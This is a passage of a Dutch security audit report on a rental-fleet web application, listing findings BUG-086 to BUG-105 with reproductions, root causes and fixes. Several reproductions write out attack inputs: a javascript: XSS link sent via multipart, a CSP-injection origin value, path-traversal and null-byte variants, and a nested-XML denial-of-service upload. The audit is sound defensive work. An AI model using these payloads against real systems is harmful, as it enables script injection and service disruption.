- **Severity:** MEDIUM · **Status:** OPEN · **Type:** **Technische fout** · **Bron:** SEC-021 (**runtime bewezen**, Check 3b)
- **Feature:** Alle multipart-routes (documenten, schadecontroles, expenses-with-receipt, boetebrieven, portaalaanvragen)
- **Reproduction:** (A) JSON `POST /api/portal/requests` met `message: 'AUDIT-JSON-<a href="javascript:alert(3)">click</a>'` → opgeslagen als `"AUDIT-JSON-click"` (gestript). (B) **Dezelfde payload via `multipart/form-data`** met een geldige PDF-bijlage → **201**, opgeslagen als `"AUDIT-MULTIPART-<a href=\"javascript:alert(3)\">click</a>"` — volledig rauw, inclusief werkende `javascript:`-URL; `GET /api/portal/requests/582` geeft dezelfde rauwe waarde terug.
- **Expected:** Sanitisatie (of, beter, output-escaping) op elk pad, ongeacht content-type.
- **Actual:** `sanitizeInput` draait op `server/index.ts:181`, vóór de routes; bij `multipart/form-data` is `req.body` op dat moment leeg en wordt hij pas ín de route door multer gevuld — daarna komt er geen sanitizer meer langs.
- **Root cause:** `server/middleware/security/sanitization.ts:41-54`, geregistreerd op `server/index.ts:181`; multer draait in de route (`server/routes.ts:170,246`, `server/routes/expenses.ts:275`, e.a.).
- **Affected files:** `server/middleware/security/sanitization.ts:41-54`, `server/index.ts:181`
- **Affected data:** Elk tekstveld van elke multipart-route, bewezen op `portal_requests.message`.
- **Security impact:** Dit is het ontbrekende stuk dat BUG-072, BUG-073 en BUG-102 van "theoretisch" naar "bereikbaar" tilt — een portaalklant kan met één bijlage een `javascript:`-link in de staff-inbox plaatsen. De ingress-sanitizer waar de rest van het systeem impliciet op leunt is dus niet volledig.
- **Business impact:** De aanname "de server strip toch alle HTML" klopt niet; elke UI die multipart-data ongeëscaped rendert is kwetsbaar.
- **Fix proposal:** De sanitizer ook ná multer draaien (wrapper om `upload.single`/`.array`), of — beter — niet op ingress saneren maar op output escapen en de sinks repareren (BUG-072/073/102).
- **Regression test:** Dezelfde payload via JSON én via multipart posten; beide moeten identiek opgeslagen worden.

#### BUG-087 — CSP-header-injectie via `allowedFrameOrigins` van de portalconfig
- **Severity:** MEDIUM · **Status:** OPEN · **Type:** **Technische fout** · **Bron:** SEC-024
- **Feature:** Portal-embedding (`manage_portal`)
- **Reproduction:** Zet als `manage_portal`-gebruiker een "origin" als `https://a.example; script-src * 'unsafe-inline'` → de waarde wordt met `join(' ')` in de CSP gezet en de puntkomma voegt een extra directive toe; de CSP van alle portaalpagina's wordt verzwakt. Een lege of te ruime lijst haalt de clickjacking-bescherming weg omdat `X-Frame-Options` onvoorwaardelijk wordt verwijderd. Check 1 bevestigt de wissel live op `/portaal` (`frame-ancestors 'self' https://lamgroep.nl http://lamgroep.local`, geen `X-Frame-Options`).
- **Expected:** Elke origin valideren met `new URL()` en alleen `scheme://host[:port]` doorlaten; bij een lege lijst terugvallen op `frame-ancestors 'self'` zonder `X-Frame-Options` te verwijderen.
- **Actual:** Geen validatie op origin-syntax.
- **Root cause:** `server/middleware/security/headers.ts:110-125`, in het bijzonder `:114` en `:120`; waarden uit `server/services/portal-config.ts`.
- **Affected files:** `server/middleware/security/headers.ts:110-125`, `server/services/portal-config.ts`
- **Affected data:** De CSP van elke portaalpagina.
- **Security impact:** Een `manage_portal`-account (of iemand die die rechten via BUG-063 verkrijgt) kan de CSP van het klantportaal uitschakelen en clickjacking mogelijk maken — een persistente verzwakking die in de database staat, niet in de code.
- **Business impact:** Klantgegevens in het portaal worden blootgesteld aan clickjacking/framing door een derde partij.
- **Fix proposal:** Origins valideren (geen pad, geen spatie, geen `;`, geen `*`) en de `X-Frame-Options`-verwijdering conditioneel maken.
- **Regression test:** Een origin met `;` of een spatie opslaan → 400; de uitgeleverde CSP bevat nooit een tweede `script-src`.

#### BUG-088 — `GET /api/damage-check-templates/by-vehicle` is onbereikbaar: geschaduwd door de eerder geregistreerde `:id`-route
- **Severity:** MEDIUM · **Status:** OPEN · **Type:** **Technische fout** · **Bron:** AM-003 (herbevestigd in de hoofdmatrix)
- **Feature:** Schadecontrole-templates per voertuig
- **Reproduction:** `GET /api/damage-check-templates/by-vehicle` als `viewer`, `manager` én `admin` → **500** (3 van de 19 5xx-rijen). Express matcht `by-vehicle` als `req.params.id === "by-vehicle"`, `parseInt` → `NaN` → Postgres-fout → generieke catch.
- **Expected:** De by-vehicle-route werkt (200 met de templates van het voertuig).
- **Actual:** De route is dode code; elke aanroep geeft 500.
- **Root cause:** `server/routes/damage-check-templates.ts:35` registreert `/:id` vóór `:52`'s `/by-vehicle`.
- **Affected files:** `server/routes/damage-check-templates.ts:35,52`
- **Affected data:** Geen; functionaliteitsverlies.
- **Security impact:** Geen direct; wel dezelfde 500-in-plaats-van-400-klasse als BUG-103 (interne foutdetails, geen nette afhandeling).
- **Business impact:** Een functie die in de UI aangeboden wordt, werkt voor niemand — en faalt met een generieke serverfout in plaats van een begrijpelijke melding.
- **Fix proposal:** `/by-vehicle` boven `/:id` registreren; daarnaast de `parseIntParam`-middleware uit BUG-103.
- **Regression test:** `GET /api/damage-check-templates/by-vehicle?vehicleId=<id>` → 200.

#### BUG-089 — `GET /api/reports/maintenance-costs` geeft onvoorwaardelijk 500
- **Severity:** MEDIUM · **Status:** OPEN · **Type:** **Technische fout** · **Bron:** AM-matrix, 5xx-tabel (ook in de vorige run waargenomen)
- **Feature:** Rapportage — onderhoudskosten
- **Reproduction:** `GET /api/reports/maintenance-costs` als `viewer`, `manager` én `admin` (alle drie met `VIEW_REPORTS`/`MANAGE_REPORTS`) → **500** (3 van de 19 5xx-rijen), in twee onafhankelijke matrixruns.
- **Expected:** 200 met het onderhoudskostenrapport, of een nette 400 bij ontbrekende parameters.
- **Actual:** Onvoorwaardelijke 500 voor elke identiteit die de permissie heeft.
- **Root cause:** `server/routes/reports.ts:36` — niet verder uitgediept in deze fase (de matrix registreert de respons, niet de stacktrace); de route ligt achter `hasPermission(VIEW_REPORTS, MANAGE_REPORTS)`, dus de permissielaag is niet het probleem.
- **Affected files:** `server/routes/reports.ts:36`
- **Affected data:** Geen; functionaliteitsverlies.
- **Security impact:** Geen direct.
- **Business impact:** Het onderhoudskostenrapport is voor iedereen kapot; kostenanalyse per voertuig ontbreekt in de praktijk zonder dat iemand een foutmelding krijgt die daar iets over zegt.
- **Fix proposal:** Root cause bepalen door de servererror te loggen (naar verwachting hetzelfde patroon als BUG-088/BUG-103: een niet-gevalideerde parameter richting de storage-laag) en een regressietest toevoegen.
- **Regression test:** `GET /api/reports/maintenance-costs` met en zonder datumparameters → 200 resp. 400, nooit 500.

#### BUG-090 — `DELETE /api/reservations/:id`: check-then-act-race levert 500 met `error.message` in de respons
- **Severity:** MEDIUM · **Status:** OPEN · **Type:** **Technische fout** · **Bron:** AM-007
- **Feature:** Reservering verwijderen (zie ook BUG-064)
- **Reproduction:** Twee accounts doen gelijktijdig `DELETE /api/reservations/<zelfde id>` (tijdens de matrixrun deden `nobody` en `viewer` dat op dezelfde test-id): één krijgt **200**, de ander **500** `{"message":"Failed to delete reservation","error":"…"}` in plaats van de eigen `410 "Reservation already deleted"`-guard.
- **Expected:** 410 (of 404/409), nooit een onafgevangen 500.
- **Actual:** De `deletedAt`-guard staat bovenaan de handler, de write pas ~70 regels lager, met de `maintenance_block`-cascade ertussen; beide verzoeken passeren de guard vóór een van beide schrijft.
- **Root cause:** `server/routes.ts:4626-4635` (guard) vs `:4697` (`storage.updateReservation(id, softDeleteData)`), generieke catch op `:4681-4687` die `error.message` echoot.
- **Affected files:** `server/routes.ts:4621-4697`
- **Affected data:** Geen corruptie waargenomen; de verliezende write faalt.
- **Security impact:** Laag direct, maar de respons echoot `error.message` verbatim — dat kan queryfragmenten of constraintnamen lekken. Zelfde klasse als BUG-043 (gelijktijdige restore) en BUG-038 (contractnummer-race): een niet-atomaire check-then-act.
- **Business impact:** Twee medewerkers (of een dubbelklik) op dezelfde reservering krijgen een onbegrijpelijke 500 in plaats van "iemand anders heeft dit net verwijderd".
- **Fix proposal:** Eén conditionele `UPDATE … WHERE deleted_at IS NULL RETURNING *` en nul rijen behandelen als "al verwijderd"; `error.message` nooit naar de client.
- **Regression test:** Twee gelijktijdige `DELETE`'s op dezelfde reservering: exact één 200, de ander 404/409/410 — nooit 500.

#### BUG-091 — Een wachtwoordwijziging trekt andere actieve sessies niet in
- **Severity:** MEDIUM · **Status:** OPEN · **Type:** **Technische fout** · **Bron:** SR-001 (**runtime bewezen**, Check 6b)
- **Feature:** Wachtwoord wijzigen, staff én portaal
- **Reproduction:** Wegwerpgebruiker `AUDIT-pwtest-1788992285947` (id 17) in twee onafhankelijke sessies A en B ingelogd (200/200). Sessie A: `POST /api/users/change-password` met correct huidig wachtwoord → **200**. Direct daarna `GET /api/user` met sessie **B**'s oude cookie → **200**, volledige user-payload. Reproduceerbaar, geen ambiguïteit. `grep -rn "revokeUserSessions\|revokeSession" server --include=*.ts` buiten de definities → nul aanroepen.
- **Expected:** Alle andere sessies van de gebruiker worden ongeldig na een wachtwoordwijziging; `revokeUserSessions()` bestaat al.
- **Actual:** Sessie B blijft volledig geauthenticeerd.
- **Root cause:** `server/routes/users.ts:349-398`, `server/portal-auth.ts:360-368`; ongebruikte tegenhanger `server/utils/security/sessionManager.ts:88-120`.
- **Affected files:** `server/routes/users.ts:349-398`, `server/portal-auth.ts:360-368`, `server/utils/security/sessionManager.ts:88-120`
- **Affected data:** `session` (express-session store), `active_sessions`.
- **Security impact:** De standaardreactie op "mijn account is gehackt" — wachtwoord wijzigen — werkt niet: een aanvaller met een gestolen sessiecookie (bijvoorbeeld via BUG-086/BUG-072) blijft ingelogd.
- **Business impact:** Een gecompromitteerd account is niet zelfstandig te herstellen; er moet handmatig in de database ingegrepen worden.
- **Fix proposal:** `revokeUserSessions(user.id, req.sessionID)` na een geslaagde wachtwoordwijziging, met een equivalent mechanisme in de portaalrealm (en de sessierijen echt uit de store verwijderen, zie BUG-095).
- **Regression test:** Twee sessies, wachtwoord wijzigen in de ene; de andere moet daarna 401 krijgen.

#### BUG-092 — `POST /api/portal/forgot` heeft in de praktijk geen rate limit (`skipSuccessfulRequests` + altijd-200)
- **Severity:** MEDIUM · **Status:** OPEN · **Type:** **Technische fout** · **Bron:** SR-005 (**runtime bewezen**, Check 7)
- **Feature:** "Wachtwoord vergeten" in het klantportaal
- **Reproduction:** 50 snelle `POST /api/portal/forgot` met hetzelfde bestaande e-mailadres vanaf één IP → **50/50 keer 200 `{"ok":true}`, geen enkele 429** — terwijl de route `loginLimiter` (5/15 min) als middleware heeft. Ter vergelijking: 7× `POST /api/portal/login` met een fout wachtwoord → 5× 401, dan 2× 429.
- **Expected:** 429 vanaf het 6e verzoek, net als op `/api/portal/login`.
- **Actual:** Geen enkel verzoek raakt ooit de teller.
- **Root cause:** `loginLimiter` heeft `skipSuccessfulRequests: true` (`server/middleware/security/rateLimiter.ts:28-35`), en `server/portal-auth.ts:373-382` retourneert **onvoorwaardelijk** `res.json({ok:true})` om e-mailenumeratie te voorkomen — elke 2xx telt voor express-rate-limit als "succesvol" en wordt overgeslagen.
- **Affected files:** `server/middleware/security/rateLimiter.ts:28-35`, `server/portal-auth.ts:373-382`
- **Affected data:** Geen corruptie; wél worden er per geslaagd verzoek echte resetmails verstuurd (deze test heeft er potentieel 50 verzonden).
- **Security impact:** Ongelimiteerd mailen namens de verhuurder naar een bekende klant. Geen open relay naar willekeurige adressen (het adres moet een bestaande, actieve portaalklant zijn), dus begrensd tot harassment/DoS op bekende accounts en de eigen mailinfrastructuur.
- **Business impact:** Mailbombing van een klant vanaf het eigen domein, met blacklisting van de SMTP-relay als reëel gevolg.
- **Fix proposal:** Een aparte `rateLimit()`-instantie voor `/api/portal/forgot` (en `/activate`) met `skipSuccessfulRequests: false` — meteen de gelegenheid om BUG-105 (gedeelde bucket) mee op te lossen.
- **Regression test:** 6+ snelle `POST /api/portal/forgot` met hetzelfde adres → 429 na de 5e.

### 2.4 LOW

#### BUG-093 — `/health` is ongeauthenticeerd, lekt omgevingsinformatie en doet een volledige users-query
- **Severity:** LOW · **Status:** OPEN · **Type:** **Technische fout** · **Bron:** SEC-022
- **Feature:** Health-endpoint
- **Reproduction:** `GET /health` zonder sessie → respons met `envVars: {DATABASE_URL: bool, SESSION_SECRET: bool, NODE_ENV}`, `database.userCount`, poolstatistieken en in de fouttak `error.message` van de databaselaag. `testDatabaseConnection()` roept `storage.getAllUsers()` aan — elke poll haalt de complete gebruikerstabel op.
- **Expected:** Een sober `200 OK`; de gedetailleerde variant achter authenticatie.
- **Actual:** Alle bovenstaande velden zijn anoniem opvraagbaar.
- **Root cause:** `server/index.ts:273-330`, helper `:313-330`.
- **Affected files:** `server/index.ts:273-330`
- **Affected data:** Aantal gebruikers, aan/uit-status van omgevingsvariabelen, `NODE_ENV`.
- **Security impact:** Een aanvaller leest af of `SESSION_SECRET` gezet is (relevant voor BUG-083) en hoeveel accounts er zijn; een flood op `/health` is een goedkope DB-amplificatie, want de route zit buiten `apiLimiter` (die alleen op `/api` staat).
- **Business impact:** Verkenningsinformatie gratis beschikbaar, plus onnodige databaselast bij elke monitoringpoll.
- **Fix proposal:** `envVars` en `userCount` schrappen, `SELECT 1` in plaats van `getAllUsers()`, de detailvariant achter auth.
- **Regression test:** Anonieme `GET /health` → body bevat geen `envVars` en geen `userCount`.

#### BUG-094 — scrypt draait met Node-standaardparameters (`N=16384`)
- **Severity:** LOW · **Status:** OPEN · **Type:** **Technische fout** · **Bron:** SEC-026
- **Feature:** Wachtwoordhashing
- **Reproduction:** `scryptAsync(password, salt, 64)` zonder options-object → Node-defaults `N=16384, r=8, p=1` (16 MB); OWASP adviseert minimaal `N=2^17`.
- **Expected:** Expliciete, actuele kostparameters, met de parameters in de hash-string zodat migratie mogelijk is.
- **Actual:** Impliciete defaults; de rest van de implementatie (16 random bytes salt, keylength 64, `timingSafeEqual`, catch bij afwijkende lengte) is correct.
- **Root cause:** `server/auth.ts:33-38` (`hashPassword`), `:40-51` (`comparePasswords`).
- **Affected files:** `server/auth.ts:33-51`
- **Affected data:** `users.password`.
- **Security impact:** Bij diefstal van de gebruikerstabel zijn wachtwoorden goedkoper te kraken dan met een actuele kostfactor; geen directe exploitatie.
- **Business impact:** Zwakkere bescherming van medewerkerswachtwoorden na een eventueel datalek.
- **Fix proposal:** `{N: 1 << 17, r: 8, p: 1, maxmem: …}` expliciet meegeven, kostparameters in de hash-string opslaan en herhashen bij een geslaagde login.
- **Regression test:** Unit test die assert dat een nieuw gegenereerde hash de verhoogde parameters bevat en dat oude hashes nog verifiëren.

#### BUG-095 — Uitloggen ruimt de `active_sessions`-rij niet op; `expiresAt` staat op 30 dagen tegenover een cookie van 15 minuten
- **Severity:** LOW · **Status:** OPEN · **Type:** **Technische fout** · **Bron:** SEC-027 (**runtime bevestigd**, Check 6)
- **Feature:** Overzicht actieve sessies (beheerscherm)
- **Reproduction:** `POST /api/logout` doet `req.logout()` (sessie-regeneratie) maar roept geen `removeSession(req.sessionID)` aan. Live meting in `lvs_audit`: **`active_sessions` 142 rijen tegenover 94 rijen in de echte express-session-store** (eerdere meting: 127 vs 1).
- **Expected:** Bij logout de rij verwijderen en `expiresAt` gelijktrekken met de cookie-`maxAge`.
- **Actual:** De rij blijft staan tot de uurlijkse `cleanExpiredSessions()` hem op `expiresAt` opruimt — en dat is 30 dagen na login.
- **Root cause:** `server/auth.ts:377-398` (logout) vs `server/utils/security/sessionManager.ts:9-50` (`trackSession`, aangeroepen op `auth.ts:356`); `expiresAt` op `auth.ts:355`, cookie op `:114`.
- **Affected files:** `server/auth.ts:114,355-356,377-398`, `server/utils/security/sessionManager.ts:9-50`
- **Affected data:** `active_sessions`.
- **Security impact:** Geen authenticatiebypass (de echte autorisatie hangt aan de session store), maar het beheerdersoverzicht toont maandenlang spooksessies, waardoor een echte verdachte sessie niet opvalt — samen met BUG-082 (verzonnen IP) is dit scherm forensisch onbruikbaar.
- **Business impact:** Het enige beheerinstrument om "wie is nu ingelogd" te zien, klopt niet.
- **Fix proposal:** `removeSession()` bij logout en `expiresAt` = cookie-`maxAge`.
- **Regression test:** Inloggen, uitloggen, en assert dat er geen `active_sessions`-rij meer bestaat voor dat sessie-id.

#### BUG-096 — CSRF-tokenvergelijking niet constant-time; anonieme bezoekers krijgen een sessie en een geldig token
- **Severity:** LOW · **Status:** OPEN · **Type:** **Technische fout** · **Bron:** SEC-028
- **Feature:** CSRF-bescherming
- **Reproduction:** `verifyCsrfToken` eindigt op `return hash === expectedHash;` — een gewone string-vergelijking. Daarnaast maakt `generateCsrfToken` bij **elke** request een `csrfSecret` in de sessie aan, ook voor niet-ingelogde bezoekers, wat ondanks `saveUninitialized: false` een `session`-rij per bezoeker oplevert.
- **Expected:** `crypto.timingSafeEqual` op buffers van gelijke lengte; het CSRF-secret pas aanmaken zodra er een geauthenticeerde sessie is.
- **Actual:** Niet-constant-time vergelijking en een geldig token voor iedere anonieme bezoeker.
- **Root cause:** `server/middleware/security/csrf.ts:54`, `:16-18`, `:100-113`.
- **Affected files:** `server/middleware/security/csrf.ts:14-113`
- **Affected data:** De `session`-tabel (groeit met één rij per anonieme bezoeker).
- **Security impact:** Het ontwerp zelf is correct (HMAC aan het sessiegeheim, geen naïef double-submit), dus de timing-lek is theoretisch. De anonieme tokenuitgifte is wél praktisch relevant: het is precies wat de ongeauthenticeerde exploitketen van BUG-060 mogelijk maakt.
- **Business impact:** Ongelimiteerde groei van de sessietabel door bots/scanners.
- **Fix proposal:** `timingSafeEqual`; het secret lui aanmaken pas bij een geauthenticeerde sessie of anonieme sessierijen periodiek opruimen.
- **Regression test:** Anoniem `GET /` → geen `session`-rij aangemaakt; tokenverificatie gebruikt `timingSafeEqual`.

#### BUG-097 — De bestandsnaamfilter van de backup-routes mist de backslash
- **Severity:** LOW · **Status:** OPEN · **Type:** **Technische fout** · **Bron:** SEC-031 (**runtime verfijnd**, Check 8)
- **Feature:** Back-ups downloaden/verwijderen
- **Reproduction:** `if (filename.includes('..') || filename.includes('/'))` — `\` wordt niet geblokkeerd. Live getest met 12 traversal-varianten op `/api/backups/download/[database/]<payload>`: de forward-slash- en dubbel-geëncodeerde varianten geven correct **400** `{"error":"Invalid filename"}`; de backslash-, absolute-Windows-pad- en UNC-varianten geven **200 met de Vite-SPA-shell** — ze bereiken de routehandler helemaal niet. **12/12 leverde geen bestandsinhoud op.**
- **Expected:** `path.basename(filename)` en vergelijken met het origineel, in plaats van een blacklist.
- **Actual:** Blacklist met een gat dat op Linux (de deployment) niet uitbuitbaar is en op Windows door de routing wordt opgevangen.
- **Root cause:** `server/routes/backups.ts:585-587`, `:672-674`, `:719-721`.
- **Affected files:** `server/routes/backups.ts:585-721`
- **Affected data:** Geen — geen enkele payload leverde inhoud op.
- **Security impact:** Vandaag geen; het blijft een blacklist waar een allowlist hoort, en die breekt zodra de routing of het platform verandert. De `Content-Disposition` krijgt de rauwe filename, maar Node weigert zelf CR/LF, dus header-injectie is uitgesloten.
- **Business impact:** Geen.
- **Fix proposal:** `path.basename()`-vergelijking in plaats van de `includes`-blacklist.
- **Regression test:** De 12 traversal-payloads uit `check8-fileserving.cjs` moeten alle 12 een **400** geven (niet een 200 met SPA-shell).

#### BUG-098 — `resolveDocumentFilePath()` volgt symlinks binnen `uploads/`
- **Severity:** LOW · **Status:** OPEN · **Type:** **Technische fout** · **Bron:** SEC-032
- **Feature:** Centrale padresolutie voor documenten
- **Reproduction:** De containmentcheck gebruikt `path.resolve()` + `startsWith(uploadsResolved + path.sep)` — correct tegen `../` en tegen absolute paden buiten uploads, maar er is geen `fs.realpathSync()`. Een symlink **binnen** `uploads/` die naar buiten wijst wordt dus gevolgd.
- **Expected:** Containment controleren op het gerealiseerde pad.
- **Actual:** Containment op het genormaliseerde, niet-gerealiseerde pad.
- **Root cause:** `server/services/document-paths.ts:33-41`.
- **Affected files:** `server/services/document-paths.ts:19-47`
- **Affected data:** Elk bestand waarnaar een symlink in `uploads/` wijst.
- **Security impact:** Ketent op BUG-069: een restore-archief met `uploads/leak -> /` maakt daarna élk bestand leesbaar via juist de nette, gescopete downloadroutes (`server/routes/portal.ts:193`, `server/routes/fines.ts:243`) — de enige plekken waar het systeem het momenteel goed doet.
- **Business impact:** De containmentcheck waar de fixes van BUG-060, BUG-070 en BUG-012 allemaal op gaan leunen, heeft zelf een gat.
- **Fix proposal:** Na `path.resolve()` ook `fs.realpathSync()` toepassen en de containment op het gerealiseerde pad controleren.
- **Regression test:** Een symlink in `uploads/` naar een bestand daarbuiten → `resolveDocumentFilePath()` weigert.

#### BUG-099 — Geen time-out op de uitgaande geocoding-/routingverzoeken
- **Severity:** LOW · **Status:** OPEN · **Type:** **Technische fout** · **Bron:** SEC-033
- **Feature:** Bezorging — adressen geocoden en routes optimaliseren
- **Reproduction:** Beide `fetch()`-aanroepen (Nominatim en OSRM) hebben geen `AbortSignal`/time-out, anders dan `server/utils/rdw-api.ts:140-148` (5 s via `AbortController`).
- **Expected:** `AbortController` met 5-10 s en een maximum op het aantal stops per verzoek.
- **Actual:** Onbegrensd wachten op een externe partij.
- **Root cause:** `server/geocoding.ts:36` (Nominatim), `:118` (OSRM); aanroepers `server/routes.ts:7529-7545`, `:7598-7619`.
- **Affected files:** `server/geocoding.ts:36,118`, `server/routes.ts:7529-7619`
- **Affected data:** Geen.
- **Security impact:** Een trage of hangende upstream houdt requesthandlers en poolconnecties bezig; een `manage_reservations`-gebruiker kan met veel `stops` in `POST /api/delivery/optimize-route` een serie hangende calls veroorzaken — resource-uitputting zonder rate limit (BUG-074).
- **Business impact:** De applicatie kan traag of onbereikbaar worden door een storing bij een gratis externe dienst.
- **Fix proposal:** `AbortController` met 5-10 s en een maximum aantal stops.
- **Regression test:** Mock een upstream die niet antwoordt; de route moet binnen 10 s een 502/504 geven.

#### BUG-100 — `fromName`/`fromEmail` worden rauw in een mailheader geïnterpoleerd
- **Severity:** LOW · **Status:** OPEN · **Type:** **Technische fout** · **Bron:** SEC-035
- **Feature:** Afzenderadres van uitgaande mail (`manage_settings`)
- **Reproduction:** `from: \`"${config.fromName}" <${config.fromEmail}>\`` met waarden uit de `email`-categorie van `app_settings`, schrijfbaar via `POST /api/app-settings` — geen escaping van `"`, `<`, `>` of CR/LF.
- **Expected:** `from: { name, address }` als object doorgeven en beide velden valideren.
- **Actual:** String-concatenatie; nodemailer normaliseert het meeste, maar de concatenatie zelf is het zwakke punt.
- **Root cause:** `server/utils/email-service.ts:276`; waarden uit `:97-105`, geschreven via `server/routes/app-settings.ts:333`.
- **Affected files:** `server/utils/email-service.ts:97-105,276`
- **Affected data:** De `From`-header van alle uitgaande mail.
- **Security impact:** Mogelijke afzendervervalsing/headermanipulatie door een `manage_settings`-account; hangt samen met BUG-081 (phishing vanaf het bedrijfsdomein).
- **Business impact:** Onjuiste of misleidende afzender op contract- en boetemails.
- **Fix proposal:** Objectvorm gebruiken en beide velden valideren op e-mailformaat en CR/LF.
- **Regression test:** `fromName` met `"` en `\r\n` opslaan → 400 of geneutraliseerd in de uitgaande header.

#### BUG-101 — Ongebounde recursie bij het parsen van CJIB-XML zet het proces stil
- **Severity:** LOW · **Status:** OPEN · **Type:** **Technische fout** · **Bron:** SEC-036
- **Feature:** CJIB-import (`POST /api/fines/imports/upload`, `manage_fines`, memory-storage, 20 MB)
- **Reproduction:** Upload 20 MB diep genest XML; `collectRecordNodes` wandelt de boom recursief zonder dieptelimiet en put de call stack uit. `server/index.ts:126-134` vangt `uncaughtException` af met een **graceful shutdown**, dus een stack overflow zet het proces stil.
- **Expected:** Dieptelimiet in de parser en een lagere uploadlimiet voor XML; een parserfout hoort een 400 te geven.
- **Actual:** Procesbeëindiging.
- **Root cause:** `server/services/cjib/parser.ts:108-113`; route `server/routes/fines.ts:89-95`; shutdownbeleid `server/index.ts:126-134`.
- **Affected files:** `server/services/cjib/parser.ts:108-113`, `server/routes/fines.ts:89-95`, `server/index.ts:126-134`
- **Affected data:** Geen; beschikbaarheid.
- **Security impact:** Derde DoS-vector op hetzelfde "elke fout is fataal"-beleid als BUG-002 en BUG-061, hier achter `manage_fines`. `importUpload` is bovendien de enige multer-instantie zonder `createSecureMulterFilter`. XXE en billion-laughs zijn wél geblokkeerd door `fast-xml-parser` (SEC-034).
- **Business impact:** Een corrupt of geprepareerd CJIB-bestand legt de applicatie plat in plaats van een importfout te geven.
- **Fix proposal:** Dieptelimiet in `collectRecordNodes`, uploadlimiet voor XML verlagen, en de parseraanroep in try/catch met een 400 (samen met de systemische fix van BUG-061).
- **Regression test:** Upload van diep genest XML → 400, en `GET /health` daarna → 200.

#### BUG-102 — `innerHTML` in de print-/rapportbouwer van de client
- **Severity:** LOW · **Status:** OPEN · **Type:** **Technische fout** · **Bron:** SEC-038 (DOM-executie niet getest, zie §7)
- **Feature:** Rapporten afdrukken (print-iframe)
- **Reproduction:** `doc.body.innerHTML = content`, waarbij merk, model, categorie, omschrijving, klantnaam en transportvelden rauw als `${}` in `<td>`-elementen worden gezet.
- **Expected:** De tabel opbouwen met `createElement`/`textContent` (het patroon uit `client/src/components/barcodes/key-label-print.ts:139`) of elke waarde HTML-escapen.
- **Actual:** Rauwe interpolatie; dit is element-content-context, dus een payload heeft `<` nodig — wat de globale server-side tag-stripper vandaag wegneemt (`sanitization.ts:12`).
- **Root cause:** `client/src/pages/reports/index.tsx:1247`, met servergegevens op `:614,868,962-963,1033,1121,1137,1218,1225-1232` (`:659` gebruikt alleen i18n-strings).
- **Affected files:** `client/src/pages/reports/index.tsx:614-1247`
- **Affected data:** Voertuig-, klant- en transportvelden.
- **Security impact:** Vandaag afhankelijk van precies één ingressfilter — en dat filter is aantoonbaar te omzeilen via multipart (BUG-086), en zal ook niet gelden voor de CSV-/kentekenbulkimport, de CJIB-importer of directe DB-schrijfacties. Dan is dit XSS in de print-iframe op de app-origin, zonder CSP-mitigatie (BUG-078).
- **Business impact:** Eén verkeerde invoerroute maakt hier een werkende XSS van.
- **Fix proposal:** `createElement`/`textContent` of expliciete HTML-escaping per waarde.
- **Regression test:** Een record met `<script>` in `brand` afdrukken; het iframe-DOM mag geen `<script>`-element bevatten.

#### BUG-103 — Niet-numerieke, oversized of null-byte `:id`-parameters geven 500 in plaats van 400 op ~19 GET-endpoints
- **Severity:** LOW · **Status:** OPEN · **Type:** **Technische fout** · **Bron:** AM-002
- **Feature:** Padparameter-validatie, applicatiebreed
- **Reproduction:** Als admin: `GET /api/settings/abc` (of `%00`, of een 5000-tekens lange cijferreeks) → **500** `{"error":"Failed to fetch setting"}` — `parseInt('abc')` → `NaN` → `storage.getAppSetting(NaN)` → Postgres `invalid input syntax for type integer` → generieke catch. Gereproduceerd op **19 endpoints** in `barcodes`, `interactive-damage-checks`, `app-settings`, `custom-notifications`, `damage-check-templates`, `expenses`, `settings`, `vehicle-diagram-templates`.
- **Expected:** 400 met een validatiemelding, zoals `GET /api/vehicles/abc` → **400** `{"message":"Invalid vehicle ID"}` (live bevestigd in Check 5) al correct doet.
- **Actual:** 500 met een generieke melding; de handler heeft geen id-validatie.
- **Root cause:** Ontbrekende gedeelde parametervalidatie; per route een kale `parseInt(req.params.id)`.
- **Affected files:** de 19 routes uit de `fuzz-get.mjs`-lijst (`server/routes.ts`, `server/routes/app-settings.ts`, `settings.ts`, `expenses.ts`, `custom-notifications.ts`, `damage-check-templates.ts`, `vehicle-diagram-templates.ts`)
- **Affected data:** Geen.
- **Security impact:** Minimaal — geen leak, geen bypass. Onderscheidt zich van BUG-057 (stack trace bij malformed JSON, dev-gated) door trigger en respons: hier een padparameter en een generieke 500 in élke omgeving.
- **Business impact:** Monitoring ziet 500's waar 400's horen te staan, wat echte serverfouten in het ruis laat verdwijnen.
- **Fix proposal:** Eén gedeelde `parseIntParam(name)`-middleware die 400 geeft voor een niet-positief-geheel `:id`, toegepast op alle `:id`-routes.
- **Regression test:** `GET /api/settings/abc` → 400; idem voor `%00` en een 5000-tekens id.

#### BUG-104 — `POST /api/interactive-damage-checks` heeft geen bodyvalidatie: ontbrekende verplichte velden geven 500
- **Severity:** LOW · **Status:** OPEN · **Type:** **Technische fout** · **Bron:** AM-008
- **Feature:** Interactieve schadecontrole aanmaken (zie ook BUG-065)
- **Reproduction:** Als `nobody` of `viewer`: `POST /api/interactive-damage-checks {}` (lege body) → **500** (2 van de 19 5xx-rijen in de matrix).
- **Expected:** 400 met een melding die het ontbrekende veld noemt (bijvoorbeeld `vehicleId`).
- **Actual:** 500, generieke melding; een Postgres NOT-NULL-violation ontsnapt naar de generieke catch.
- **Root cause:** `server/routes.ts:6850-6855` bouwt `checkData = {...req.body, checkDate, completedBy}` **zonder zodschema of verplichte-veldcheck** en geeft dat door aan `storage.createInteractiveDamageCheck()` (`:6868`).
- **Affected files:** `server/routes.ts:6849-6899`
- **Affected data:** Geen (de insert faalt).
- **Security impact:** Minimaal; zelfde klasse als BUG-103, nu op een request-body. Wel is `{...req.body}` zonder schema dezelfde mass-assignment-vorm als BUG-063/BUG-084 — hier op een tabel waarvan `pdfPath` een XSS-sink voedt (BUG-072).
- **Business impact:** Een client die een incomplete payload stuurt krijgt een onbegrijpelijke 500.
- **Fix proposal:** Zodschema voor de create-body (gespiegeld aan de update-route), 400 vóór de storage-aanroep, en padvelden uit de body weren.
- **Regression test:** `POST /api/interactive-damage-checks {}` → 400, niet 500.

#### BUG-105 — Eén gedeelde rate-limiter-teller over vier auth-routes
- **Severity:** LOW · **Status:** OPEN · **Type:** **Technische fout** · **Bron:** SR-003 (**runtime bevestigd**, Check 2 en Check 7)
- **Feature:** Login-rate-limiting, staff én portaal
